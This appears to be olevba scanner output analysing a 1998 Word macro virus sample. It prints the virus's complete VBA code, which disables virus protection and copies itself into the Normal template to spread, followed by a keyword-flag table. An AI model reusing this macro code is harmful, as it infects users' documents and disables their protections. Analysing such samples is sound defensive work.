olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs.k-118d374a420c78bf182a15c871d6e28eb78ee2cf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs.k-118d374a420c78bf182a15c871d6e28eb78ee2cf - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Quote
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
WordBasic.DisableAutoMacros 0
Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
ι = Application.StartupPath & "\Mscreate.dir"
If GetAttr(ι) <> 34 Then SetAttr ι, 0: VBProject.VBComponents(1).Export ι: SetAttr ι, 34
With ActiveDocument.VBProject
If .HelpContextID <> 1 Then _
.HelpContextID = 1: _
.VBComponents(1).CodeModule.AddFromFile ι: _
.VBComponents(1).CodeModule.DeleteLines 1, 4
End With
With NormalTemplate.VBProject
If .HelpContextID <> 1 Then _
.HelpContextID = 1: _
.VBComponents(1).CodeModule.AddFromFile ι: _
.VBComponents(1).CodeModule.DeleteLines 1, 4
End With
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

